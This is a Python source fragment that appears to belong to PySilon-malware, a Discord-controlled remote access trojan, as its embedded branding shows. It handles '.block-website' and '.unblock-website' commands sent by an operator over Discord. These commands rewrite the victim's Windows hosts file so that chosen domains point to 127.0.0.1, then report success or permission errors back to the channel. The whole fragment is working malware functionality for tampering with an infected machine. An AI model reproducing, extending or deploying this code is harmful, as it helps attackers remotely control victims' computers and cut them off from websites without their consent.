import ctypes
from urllib.parse import urlparse
import os

def obtener_ruta_hosts():
    ruta_hosts = r'C:\Windows\System32\drivers\etc\hosts'
    if os.path.exists(ruta_hosts):
        return ruta_hosts
    return None

if message.content.startswith('.block-website'):
    await message.delete()
    sitio_web = message.content[14:].strip().strip('"').strip("'")
    
    if not sitio_web:
        embed = discord.Embed(title="📛 Error", description='```Syntax: .block-website [https://example.com](https://example.com)```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        if not sitio_web.startswith(('http://', 'https://')):
            url_procesar = 'http://' + sitio_web
        else:
            url_procesar = sitio_web

        dominio = urlparse(url_procesar).netloc
        if not dominio:
            dominio = sitio_web.split('/')[0]

        ruta_hosts = obtener_ruta_hosts()

        if ruta_hosts:
            try:
                dominios_bloquear = [dominio]
                if dominio.startswith('www.'):
                    dominios_bloquear.append(dominio[4:])
                else:
                    dominios_bloquear.append('www.' + dominio)

                with open(ruta_hosts, 'r') as f_hosts:
                    contenido_actual = f_hosts.read()

                entradas_nuevas = []
                for dom in dominios_bloquear:
                    if dom not in contenido_actual:
                        entradas_nuevas.append(f"127.0.0.1 {dom}\n")

                if entradas_nuevas:
                    with open(ruta_hosts, 'a') as f_hosts:
                        f_hosts.writelines(entradas_nuevas)

                embed = discord.Embed(title="🟢 Success", description=f'```Website {dominio} has been blocked. Unblock it by using .unblock-website {dominio}```', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                reaction_msg = await message.channel.send(embed=embed)
                await reaction_msg.add_reaction('🔴')
            except PermissionError:
                embed = discord.Embed(title="🔴 Hold on!", description='```No permissions to edit hosts file (Admin required)```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                reaction_msg = await message.channel.send(embed=embed)
                await reaction_msg.add_reaction('🔴')
        else:
            embed = discord.Embed(title="🔴 Hold on!", description='```Hostfile not found```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed)
            await reaction_msg.add_reaction('🔴')

elif message.content.startswith('.unblock-website'):
    await message.delete()
    sitio_web = message.content[16:].strip().strip('"').strip("'")

    if not sitio_web:
        embed = discord.Embed(title="📛 Error", description='```Syntax: .unblock-website <example.com>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        if sitio_web.startswith(('http://', 'https://')):
            url_procesar = sitio_web
        else:
            url_procesar = 'http://' + sitio_web

        dominio = urlparse(url_procesar).netloc
        if not dominio:
            dominio = sitio_web.split('/')[0]

        dominio_limpio = dominio.replace('www.', '')

        ruta_hosts = obtener_ruta_hosts()

        if ruta_hosts:
            try:
                with open(ruta_hosts, 'r') as f_hosts:
                    lineas = f_hosts.readlines()

                lineas_filtradas = [linea for linea in lineas if dominio_limpio not in linea]

                with open(ruta_hosts, 'w') as f_hosts:
                    f_hosts.writelines(lineas_filtradas)

                embed = discord.Embed(title="🟢 Success", description=f'```Website {dominio_limpio} has been unblocked.```', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                reaction_msg = await message.channel.send(embed=embed)
                await reaction_msg.add_reaction('🔴')
            except PermissionError:
                embed = discord.Embed(title="🔴 Hold on!", description='```No permissions to edit hosts file (Admin required)```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                reaction_msg = await message.channel.send(embed=embed)
                await reaction_msg.add_reaction('🔴')
        else:
            embed = discord.Embed(title="🔴 Hold on!", description='```Hostfile not found```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed)
            await reaction_msg.add_reaction('🔴')
